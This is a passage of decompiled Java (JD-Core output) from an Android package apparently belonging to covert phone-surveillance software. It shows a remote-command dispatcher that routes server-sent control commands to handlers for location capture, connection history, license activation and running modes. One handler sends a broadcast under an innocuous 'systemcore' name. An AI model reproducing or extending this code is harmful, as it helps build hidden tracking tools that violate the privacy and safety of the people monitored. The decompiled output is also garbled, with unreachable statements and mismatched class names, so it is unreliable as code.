    //   431: aload_2
    //   432: athrow
    //   433: aload 4
    //   435: ifnull -187 -> 248
    //   438: aload 4
    //   440: invokevirtual 192	com/vvt/shell/f:d	()V
    //   443: goto -195 -> 248
    //   446: astore_2
    //   447: goto -26 -> 421
    //   450: astore_2
    //   451: iconst_0
    //   452: istore_1
    //   453: aconst_null
    //   454: astore_2
    //   455: goto -215 -> 240
    //   458: iconst_0
    //   459: istore 8
    //   461: aconst_null
    //   462: astore 7
    //   464: goto -333 -> 131
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	467	0	this	v
    //   1	377	1	bool1	boolean
    //   410	43	1	i	int
    //   3	226	2	localObject1	Object
    //   236	1	2	localException1	Exception
    //   239	162	2	localObject2	Object
    //   417	15	2	localObject3	Object
    //   446	1	2	localObject4	Object
    //   450	1	2	localException2	Exception
    //   454	1	2	localObject5	Object
    //   7	25	3	localList	List
    //   11	428	4	localf	com.vvt.shell.f
    //   19	10	5	j	int
    //   22	391	6	k	int
    //   49	414	7	localObject6	Object
    //   64	396	8	bool2	boolean
    //   84	307	9	localObject7	Object
    //   178	31	10	str	String
    //   181	3	11	m	int
    //   188	23	12	arrayOfObject	Object[]
    //   191	14	13	n	int
    //   219	3	14	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   13	19	236	java/lang/Exception
    //   32	39	236	java/lang/Exception
    //   40	44	236	java/lang/Exception
    //   45	49	236	java/lang/Exception
    //   51	56	236	java/lang/Exception
    //   60	64	236	java/lang/Exception
    //   71	74	236	java/lang/Exception
    //   81	84	236	java/lang/Exception
    //   86	91	236	java/lang/Exception
    //   97	102	236	java/lang/Exception
    //   120	128	236	java/lang/Exception
    //   131	136	236	java/lang/Exception
    //   141	148	236	java/lang/Exception
    //   150	157	236	java/lang/Exception
    //   162	169	236	java/lang/Exception
    //   170	174	236	java/lang/Exception
    //   183	188	236	java/lang/Exception
    //   196	199	236	java/lang/Exception
    //   206	208	236	java/lang/Exception
    //   210	215	236	java/lang/Exception
    //   216	219	236	java/lang/Exception
    //   228	233	236	java/lang/Exception
    //   255	260	236	java/lang/Exception
    //   278	286	236	java/lang/Exception
    //   293	301	236	java/lang/Exception
    //   308	316	236	java/lang/Exception
    //   328	333	236	java/lang/Exception
    //   351	359	236	java/lang/Exception
    //   371	376	236	java/lang/Exception
    //   392	400	236	java/lang/Exception
    //   8	11	417	finally
    //   13	19	446	finally
    //   32	39	446	finally
    //   40	44	446	finally
    //   45	49	446	finally
    //   51	56	446	finally
    //   60	64	446	finally
    //   71	74	446	finally
    //   81	84	446	finally
    //   86	91	446	finally
    //   97	102	446	finally
    //   120	128	446	finally
    //   131	136	446	finally
    //   141	148	446	finally
    //   150	157	446	finally
    //   162	169	446	finally
    //   170	174	446	finally
    //   183	188	446	finally
    //   196	199	446	finally
    //   206	208	446	finally
    //   210	215	446	finally
    //   216	219	446	finally
    //   228	233	446	finally
    //   255	260	446	finally
    //   278	286	446	finally
    //   293	301	446	finally
    //   308	316	446	finally
    //   328	333	446	finally
    //   351	359	446	finally
    //   371	376	446	finally
    //   392	400	446	finally
    //   8	11	450	java/lang/Exception
  }
  
  private boolean k()
  {
    boolean bool1 = false;
    try
    {
      Object localObject1 = new com/vvt/polymorphic/AppContainerInfo;
      ((AppContainerInfo)localObject1).<init>();
      Object localObject3 = this.d;
      localObject3 = ((AppEngine1)localObject3).b();
      ((AppContainerInfo)localObject1).load((String)localObject3);
      localObject1 = ((AppContainerInfo)localObject1).getPackageName();
      boolean bool2 = b;
      if (bool2) {}
      localObject3 = this.d;
      localObject3 = ((AppEngine1)localObject3).a();
      String str = com.vvt.m.b.c;
      bool1 = com.vvt.polymorphic.b.a((Context)localObject3, str, (String)localObject1);
      bool3 = b;
      if (!bool3) {}
    }
    finally
    {
      for (;;)
      {
        boolean bool3 = c;
        if (!bool3) {}
      }
    }
    return bool1;
  }
  
  private int l()
  {
    return 1;
  }
  
  private boolean m()
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    try
    {
      Intent localIntent = new android/content/Intent;
      Object localObject2 = "com.systemcore.ui.action.close";
      localIntent.<init>((String)localObject2);
      localObject2 = this.d;
      localObject2 = ((AppEngine1)localObject2).a();
      ((Context)localObject2).sendBroadcast(localIntent);
    }
    finally
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
    return false;
  }
  
  public Object a(TcpSocketCmd paramTcpSocketCmd)
  {
    Object localObject1 = null;
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    boolean bool4 = false;
    Object localObject2 = null;
    bool1 = paramTcpSocketCmd instanceof RemoteGetRmtCtrl;
    Object localObject3;
    if (bool1)
    {
      bool1 = b;
      if (bool1) {}
      localObject3 = this.d.q;
    }
    for (;;)
    {
      bool4 = b;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      return localObject3;
      bool1 = paramTcpSocketCmd instanceof RemoteOnCommandReceive;
      Object localObject5;
      boolean bool3;
      if (bool1)
      {
        try
        {
          paramTcpSocketCmd = (RemoteOnCommandReceive)paramTcpSocketCmd;
          localObject3 = paramTcpSocketCmd.getData();
          localObject3 = (ControlCommand)localObject3;
          RemoteFunction localRemoteFunction = ((ControlCommand)localObject3).getFunction();
          boolean bool5 = b;
          if (bool5) {}
          int[] arrayOfInt = x.a;
          int m = localRemoteFunction.ordinal();
          m = arrayOfInt[m];
          switch (m)
          {
          default: 
            localObject3 = new com/vvt/remotecontrol/RemoteControlException;
            localObject2 = "Function not supported.";
            ((RemoteControlException)localObject3).<init>((String)localObject2);
            continue;
          }
        }
        finally
        {
          localObject2 = localObject4;
          bool1 = c;
          if (bool1) {}
          localObject5 = new com/vvt/remotecontrol/RemoteControlException;
          localObject2 = ((Throwable)localObject2).getMessage();
          ((RemoteControlException)localObject5).<init>((String)localObject2);
        }
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).k;
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).o;
        Object localObject6 = this.d;
        localObject6 = ((AppEngine1)localObject6).l;
        localObject6 = ((com.vvt.phoneinfo.b)localObject6).d();
        bool1 = ((com.vvt.license.b)localObject5).a((com.vvt.productinfo.a)localObject2, (String)localObject6);
        localObject5 = Boolean.valueOf(bool1);
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).k;
        localObject5 = ((com.vvt.license.b)localObject5).a();
        localObject5 = ((LicenseInfo)localObject5).getLicenseStatus();
        int j = ((LicenseStatus)localObject5).getStatusValue();
        localObject5 = Integer.valueOf(j);
        continue;
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).a;
        localObject6 = this.d;
        localObject6 = ((AppEngine1)localObject6).k;
        localObject5 = a((ControlCommand)localObject5, (ActivationManager)localObject2, (com.vvt.license.a)localObject6);
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).a;
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).k;
        localObject2 = ((com.vvt.license.b)localObject2).a();
        localObject5 = a((ActivationManager)localObject5, (LicenseInfo)localObject2);
        continue;
        localObject2 = new com/vvt/appengine/a/bz;
        ((bz)localObject2).<init>();
        localObject6 = this.d;
        boolean bool2 = ((bz)localObject2).b((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/bn;
        ((bn)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((bn)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/bz;
        ((bz)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((bz)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/f;
        ((com.vvt.appengine.a.f)localObject2).<init>();
        localObject6 = this.d;
        localObject5 = ((com.vvt.appengine.a.f)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        continue;
        localObject2 = new com/vvt/appengine/a/cb;
        ((cb)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((cb)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/by;
        ((by)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((by)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/by;
        ((by)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((by)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/bx;
        ((bx)localObject2).<init>();
        localObject6 = this.d;
        bool2 = ((bx)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject5 = new com/vvt/appengine/a/av;
        ((av)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((av)localObject5).a((AppEngine1)localObject2);
        continue;
        bool2 = true;
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = true;
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = true;
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = true;
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = true;
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject2 = new com/vvt/appengine/a/n;
        localObject6 = this.d;
        ((n)localObject2).<init>((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = ((n)localObject2).a();
        continue;
        localObject5 = new com/vvt/appengine/a/g;
        ((g)localObject5).<init>();
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).k;
        localObject2 = ((com.vvt.license.b)localObject2).a();
        localObject6 = this.d;
        localObject6 = ((AppEngine1)localObject6).e;
        localObject5 = ((g)localObject5).a((LicenseInfo)localObject2, (com.vvt.configurationmanager.d)localObject6);
        continue;
        localObject5 = new com/vvt/appengine/a/j;
        ((j)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((j)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/ AppEngine1;
        ((com.vvt.appengine.a.h)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((com.vvt.appengine.a.h)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/i;
        ((i)localObject5).<init>();
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).j;
        localObject5 = ((i)localObject5).a((com.vvt.eventrepository.b)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/l;
        localObject2 = this.d;
        localObject2 = ((AppEngine1)localObject2).z;
        localObject6 = this.d;
        localObject6 = ((AppEngine1)localObject6).h;
        localObject1 = this.d;
        localObject1 = ((AppEngine1)localObject1).a();
        ((l)localObject5).<init>((com.vvt.capture.location.a)localObject2, (com.vvt.base.a)localObject6, (Context)localObject1);
        localObject5 = ((l)localObject5).a();
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).f;
        localObject5 = ((com.vvt.connectionhistorymanager.b)localObject5).a();
        continue;
        localObject5 = new com/vvt/appengine/a/be;
        ((be)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((be)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/az;
        ((az)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((az)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/bi;
        localObject2 = this.d;
        localObject6 = this.d;
        localObject6 = ((AppEngine1)localObject6).h;
        ((bi)localObject5).<init>((AppEngine1)localObject2, (com.vvt.base.a)localObject6);
        localObject5 = ((bi)localObject5).a();
        continue;
        localObject5 = new com/vvt/appengine/a/bj;
        ((bj)localObject5).<init>();
        localObject2 = this.d;
        bool2 = ((bj)localObject5).a((AppEngine1)localObject2);
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject5 = new com/vvt/appengine/a/bc;
        ((bc)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((bc)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/ax;
        ((ax)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((ax)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = new com/vvt/appengine/a/z;
        ((z)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((z)localObject5).a((AppEngine1)localObject2);
        continue;
        bool2 = g();
        localObject5 = Boolean.valueOf(bool2);
        continue;
        localObject5 = b((ControlCommand)localObject5);
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).d();
        continue;
        bool2 = h();
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = k();
        localObject5 = Boolean.valueOf(bool2);
        continue;
        bool2 = m();
        localObject5 = Boolean.valueOf(bool2);
        continue;
        int k = l();
        localObject5 = Integer.valueOf(k);
        continue;
        k = 0;
        localObject5 = null;
        continue;
        localObject5 = b();
        continue;
        localObject5 = c((ControlCommand)localObject5);
        continue;
        localObject5 = a((ControlCommand)localObject5);
        continue;
        localObject2 = new com/vvt/appengine/a/ba;
        ((ba)localObject2).<init>((ControlCommand)localObject5);
        localObject5 = this.d;
        localObject5 = ((ba)localObject2).a((AppEngine1)localObject5);
        continue;
        localObject2 = new com/vvt/appengine/a/bq;
        ((bq)localObject2).<init>((ControlCommand)localObject5);
        localObject5 = this.d;
        localObject5 = ((bq)localObject2).a((AppEngine1)localObject5);
        continue;
        localObject5 = new com/vvt/appengine/a/e;
        ((com.vvt.appengine.a.e)localObject5).<init>();
        localObject2 = this.d;
        localObject5 = ((com.vvt.appengine.a.e)localObject5).a((AppEngine1)localObject2);
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).d();
        localObject2 = RunningMode.FULL;
        if (localObject5 == localObject2) {}
        for (;;)
        {
          localObject5 = Boolean.valueOf(i);
          break;
          i = 0;
          localObject6 = null;
        }
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).d();
        localObject2 = RunningMode.FULL;
        if (localObject5 == localObject2) {
          k = i;
        }
        for (;;)
        {
          localObject5 = Boolean.valueOf(k);
          break;
          bool3 = false;
          localObject5 = null;
        }
        localObject5 = c();
        continue;
        localObject5 = d();
        continue;
        bool3 = e();
        localObject5 = Boolean.valueOf(bool3);
        continue;
        localObject5 = f();
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).E;
        localObject5 = a((c)localObject5);
        continue;
        localObject2 = new com/vvt/appengine/a/as;
        ((as)localObject2).<init>();
        localObject6 = this.d;
        bool3 = ((as)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        localObject5 = Boolean.valueOf(bool3);
        continue;
        localObject2 = new com/vvt/appengine/a/cd;
        ((cd)localObject2).<init>();
        localObject6 = this.d;
        localObject5 = ((cd)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        continue;
        localObject2 = new com/vvt/appengine/a/d;
        ((com.vvt.appengine.a.d)localObject2).<init>();
        localObject6 = this.d;
        localObject5 = ((com.vvt.appengine.a.d)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
        continue;
        localObject5 = this.d;
        localObject5 = ((AppEngine1)localObject5).d();
        localObject2 = RunningMode.FULL;
        long l;
        if (localObject5 == localObject2)
        {
          bool3 = a;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          h();
          bool3 = a;
          if (bool3) {}
          localObject5 = new com/vvt/remotecontrol/ControlCommand;
          ((ControlCommand)localObject5).<init>();
          localObject2 = "1";
          ((ControlCommand)localObject5).setData(localObject2);
          c((ControlCommand)localObject5);
          bool3 = a;
          if (bool3) {}
          l = 5000L;
          SystemClock.sleep(l);
          localObject5 = new com/vvt/appengine/a/bv;
          ((bv)localObject5).<init>();
          localObject2 = this.d;
          bool3 = ((bv)localObject5).a((AppEngine1)localObject2);
          localObject5 = Boolean.valueOf(bool3);
        }
        else
        {
          localObject5 = this.d;
          localObject5 = ((AppEngine1)localObject5).d();
          localObject2 = RunningMode.LIMITED_1;
          if (localObject5 == localObject2)
          {
            bool3 = a;
            if (bool3) {}
            bool3 = a;
            if (bool3) {}
            localObject5 = new com/vvt/remotecontrol/ControlCommand;
            ((ControlCommand)localObject5).<init>();
            localObject2 = "1";
            ((ControlCommand)localObject5).setData(localObject2);
            c((ControlCommand)localObject5);
            bool3 = a;
            if (bool3) {}
            l = 5000L;
            SystemClock.sleep(l);
            localObject5 = new com/vvt/appengine/a/bv;
            ((bv)localObject5).<init>();
            localObject2 = this.d;
            bool3 = ((bv)localObject5).a((AppEngine1)localObject2);
            localObject5 = Boolean.valueOf(bool3);
          }
          else
          {
            bool3 = false;
            localObject5 = null;
            localObject5 = Boolean.valueOf(false);
            continue;
            localObject2 = this.d;
            localObject2 = ((AppEngine1)localObject2).M;
            if (localObject2 != null)
            {
              localObject2 = new com/vvt/appengine/a/bg;
              ((bg)localObject2).<init>();
              localObject6 = this.d;
              localObject5 = ((bg)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
            }
            else
            {
              bool3 = false;
              localObject5 = null;
              localObject5 = Boolean.valueOf(false);
              continue;
              localObject2 = new com/vvt/appengine/a/bs;
              ((bs)localObject2).<init>();
              localObject6 = this.d;
              localObject5 = ((bs)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
              continue;
              localObject2 = this.d;
              localObject2 = ((AppEngine1)localObject2).N;
              if (localObject2 != null)
              {
                localObject2 = new com/vvt/appengine/a/x;
                ((com.vvt.appengine.a.x)localObject2).<init>();
                localObject6 = this.d;
                localObject5 = ((com.vvt.appengine.a.x)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
              }
              else
              {
                bool3 = false;
                localObject5 = null;
                localObject5 = Boolean.valueOf(false);
                continue;
                localObject5 = new com/vvt/appengine/a/v;
                ((com.vvt.appengine.a.v)localObject5).<init>();
                localObject2 = this.d;
                localObject5 = ((com.vvt.appengine.a.v)localObject5).a((AppEngine1)localObject2);
                continue;
                localObject2 = new com/vvt/appengine/a/q;
                ((q)localObject2).<init>();
                localObject6 = this.d;
                localObject5 = ((q)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                continue;
                localObject2 = new com/vvt/appengine/a/bm;
                ((bm)localObject2).<init>();
                localObject6 = this.d;
                bool3 = ((bm)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                localObject5 = Boolean.valueOf(bool3);
                continue;
                localObject5 = b();
                continue;
                localObject2 = new com/vvt/appengine/a/p;
                ((com.vvt.appengine.a.p)localObject2).<init>();
                localObject6 = this.d;
                localObject5 = ((com.vvt.appengine.a.p)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                continue;
                localObject2 = new com/vvt/appengine/a/bl;
                ((bl)localObject2).<init>();
                localObject6 = this.d;
                bool3 = ((bl)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                localObject5 = Boolean.valueOf(bool3);
                continue;
                localObject2 = new com/vvt/appengine/a/ab;
                ((ab)localObject2).<init>();
                localObject6 = this.d;
                bool3 = ((ab)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                localObject5 = Boolean.valueOf(bool3);
                continue;
                localObject2 = new com/vvt/appengine/a/at;
                ((at)localObject2).<init>();
                localObject6 = this.d;
                localObject5 = ((at)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                continue;
                localObject5 = new com/vvt/appengine/a/bt;
                ((bt)localObject5).<init>();
                localObject2 = this.d;
                localObject5 = ((bt)localObject5).a((AppEngine1)localObject2);
                continue;
                localObject2 = new com/vvt/appengine/a/cc;
                ((cc)localObject2).<init>();
                localObject6 = this.d;
                bool3 = ((cc)localObject2).a((ControlCommand)localObject5, (AppEngine1)localObject6);
                localObject5 = Boolean.valueOf(bool3);
                continue;
                localObject2 = new com/vvt/appengine/a/bo;
                ((bo)localObject2).<init>((ControlCommand)localObject5);
                localObject5 = this.d;
                localObject5 = ((bo)localObject2).a((AppEngine1)localObject5);
                continue;
                localObject5 = new com/vvt/appengine/a/q;
                ((q)localObject5).<init>();
                localObject2 = this.d;
                localObject2 = ((AppEngine1)localObject2).b();
                bool3 = ((q)localObject5).a((String)localObject2);
                localObject5 = Boolean.valueOf(bool3);
              }
            }
          }
        }
      }
      else
      {
        bool3 = false;
        localObject5 = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/v.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */